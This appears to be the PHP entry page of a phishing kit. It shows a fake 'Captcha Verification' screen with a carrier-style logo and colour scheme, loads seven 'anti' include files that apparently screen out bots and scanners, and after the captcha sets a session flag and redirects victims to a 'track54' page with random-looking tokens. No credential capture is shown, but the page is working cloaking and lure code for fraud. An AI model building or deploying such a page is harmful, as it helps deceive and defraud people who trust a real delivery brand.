<?php
session_start();
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
error_reporting(0);

if(isset($_GET["pp"]) && $_GET["pp"] == "2300"){
session_start();
$_SESSION["good"] = "okito";
header('location:track54?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}
?>
<html>
<title>Captcha Verification</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="h">
<style>
body{
background-color:rgba(255, 255, 255);

}
.img{
width: 22%;
height: 50%;
margin-bottom: 3%;
	margin-top: 5%;
}
.tooltip {
  position: relative;
  display: inline-block;
  border-bottom: 1px solid lightgrey;
  font-family: Cambria, "Hoefler Text", "Liberation Serif", Times, "Times New Roman", "serif";
}

.tooltip .tooltiptext {
  visibility: hidden;
  width: 120px;
  background-color: black;
  color: white;
  text-align: center;
  border-radius: 6px;
  padding: 5px 0;
  
  /* Position the tooltip */
  position: absolute;
  z-index: 1;
  bottom: 100%;
  left: 50%;
  margin-left: -60px;
}

.tooltip:hover .tooltiptext {
  visibility: visible;
}
	#recp{
		background-color: white;
		width:24%;
		padding-top:0.5%;
		padding-bottom: 0.5%;
	}
@media only screen and (max-width: 600px) {
	body{
		background-position: 75% 100%; 
	}
.img{
width: 35%;
height: 23%;
}
	#recp{
		border:none;
		width:100%;
		padding-top:none;
		padding-bottom:none;
		background-color:#fdd037;
		
	}
}
</style>
	<link rel="stylesheet" href="log.css"/>
<script src='https://www.google.com/recaptcha/api.js'></script>
<div id="dour" class="transitioning hide"><p id="flkhr" class="secureMessage hide"></p></div>
<center>
<div class="div">
<img src="dh.svg" class="img" title="Logo"/><br><br>
<div id="recp" class="g-recaptcha" data-sitekey="6Ld71-EpAAAAAGje7zFx4Y8h-hsxRFnKJ19PaKlj" data-callback="correctCaptcha"></div><br><br>
<br><br>
<div class="tooltip" style="color:#fdd037">Why this process ?
 <span class="tooltiptext">This is necessary to protect users from fraud.</span>
</div>
<div id="err"></div>
</div>
</center>

<script>
var correctCaptcha = function(response) {
        if(response.length !== 0){
			setTimeout(function(){
			document.getElementById("dour").classList.remove("hide");
			document.getElementById("dour").classList.add("spinner");
			document.getElementById("flkhr").classList.remove("hide");},550)
       setTimeout(function(){window.location.href = "index.php?pp=2300"},700);
         }
        else{ document.getElementById("err").innerHTML = "Google Recaptcha Verification Failed"; };
    };
</script>
<!-- Start of LiveChat (www.livechat.com) code -->
<script>
    window.__lc = window.__lc || {};
    window.__lc.license = 15038772;
    ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
</script>
<noscript><a href="https://www.livechat.com/chat-with/15038772/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
<!-- End of LiveChat code -->
</html>